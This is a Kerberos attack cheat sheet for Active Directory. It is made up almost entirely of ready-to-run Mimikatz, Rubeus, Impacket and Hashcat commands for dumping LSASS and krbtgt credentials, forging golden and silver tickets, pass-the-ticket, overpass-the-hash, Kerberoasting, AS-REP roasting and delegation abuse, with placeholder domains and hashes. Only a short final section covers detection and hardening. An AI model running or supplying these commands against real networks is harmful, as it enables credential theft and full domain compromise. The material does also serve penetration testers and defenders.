# Kerberos

## Kerberos Attacks Cheatsheet

### Kerberos Basics

* **TGT**: Encrypted with krbtgt hash, valid 10h, stored in LSASS
* **TGS**: Service-specific ticket granted by KDC after TGT verification

### Reconnaissance

```powershell
# Enumerate SPNs in domain
setspn -Q */*

# Find user SPNs (Kerberoastable)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Check if account is sensitive and cannot be delegated
Get-ADUser -Identity target_user -Properties AccountNotDelegated

# Check kerberos delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation
```

### Ticket Extraction

```powershell
# List all tickets in current session
klist

# Extract tickets with Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

# Extract with Rubeus
Rubeus.exe dump /service:krbtgt
Rubeus.exe dump /user:administrator
```

### Silver Ticket Attack

```powershell
# Get service account hash
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::lsa /patch

# Service Types and their SPNs
# CIFS - File Share
# HTTP - Web Services
# LDAP - Directory Services
# HOST - RPC, WMI, PowerShell Remoting
# MSSQLSvc - Microsoft SQL Server
# RPCSS - Remote Procedure Calls

# Generate silver ticket for CIFS
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:server.corp.local /service:cifs /rc4:1a59bd44fe5bec11fe32bb34bfa10d55 /user:admin /ptt

# Generate silver ticket for HOST service
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:server.corp.local /service:host /rc4:1a59bd44fe5bec11fe32bb34bfa10d55 /user:admin /ptt

# Test access
dir \\server.corp.local\c$
wmic /node:server.corp.local process list
```

### Golden Ticket Attack

```powershell
# Get domain SID
whoami /user
wmic useraccount get name,sid

# Dump krbtgt hash
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch /name:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Create golden ticket
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:1a59bd44fe5bec11fe32bb34bfa10d55 /user:admin /id:500 /ptt

# Alternative with specific groups
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:1a59bd44fe5bec11fe32bb34bfa10d55 /user:admin /id:500 /groups:512,513,518,519,520 /ptt

# Create golden ticket with longer validity (default 10y)
mimikatz # kerberos::golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:1a59bd44fe5bec11fe32bb34bfa10d55 /user:admin /id:500 /ticket:golden.kirbi /endin:8760

# Using Rubeus
Rubeus.exe golden /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /rc4:1a59bd44fe5bec11fe32bb34bfa10d55 /user:admin /ptt

# Test access
dir \\dc01.corp.local\c$
psexec \\dc01.corp.local cmd.exe
```

### Pass the Ticket Attack

```powershell
# Export tickets with Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

# Inject ticket
mimikatz # kerberos::ptt ticket.kirbi

# Export and inject with Rubeus
Rubeus.exe dump /service:krbtgt /nowrap
Rubeus.exe ptt /ticket:doIFCDCC...AbABd

# Inject multiple tickets
dir *.kirbi | mimikatz # "kerberos::ptt @"
```

### Overpass the Hash

```powershell
# Using Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:1a59bd44fe5bec11fe32bb34bfa10d55 /run:cmd.exe

# Using Rubeus
Rubeus.exe asktgt /user:admin /domain:corp.local /rc4:1a59bd44fe5bec11fe32bb34bfa10d55 /ptt

# Then request TGT
net use \\dc01
klist
```

### Kerberoasting

```powershell
# Get SPN accounts
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Extract TGS with PowerView
Request-SPNTicket -SPN "MSSQLSvc/sqlserver.corp.local:1433"

# Extract with Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# Extract with Impacket
GetUserSPNs.py corp.local/user:password -outputfile hashes.txt

# Crack with Hashcat
hashcat -m 13100 -a 0 hashes.txt wordlist.txt
```

### AS-REP Roasting

```powershell
# Find vulnerable accounts
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth

# Request tickets with Rubeus
Rubeus.exe asreproast /nowrap

# Request with Impacket
GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt

# Crack with Hashcat
hashcat -m 18200 -a 0 hashes.txt wordlist.txt
```

### Delegation Attacks

```powershell
# Find systems with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation

# Extract with Rubeus
Rubeus.exe monitor /interval:5

# Find systems with constrained delegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# S4U attacks with Rubeus
Rubeus.exe s4u /user:svc_constrained /rc4:1a59bd44fe5bec11fe32bb34bfa10d55 /impersonateuser:administrator /domain:corp.local /msdsspn:cifs/server.corp.local /ptt
```

### Detection/Prevention

```powershell
# Enable AES encryption
Set-ADUser -Identity targetUser -KerberosEncryptionType AES128,AES256

# Add to Protected Users group
Add-ADGroupMember -Identity "Protected Users" -Members "admin"

# Check Audit Policy
auditpol /get /subcategory:"Kerberos Authentication Service"

# Set up advanced auditing
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable

# Monitor events
# 4768: TGT request
# 4769: Service ticket request
# 4771: Kerberos pre-auth failed
# 4624: Account logon
# 4672: Admin logon
```
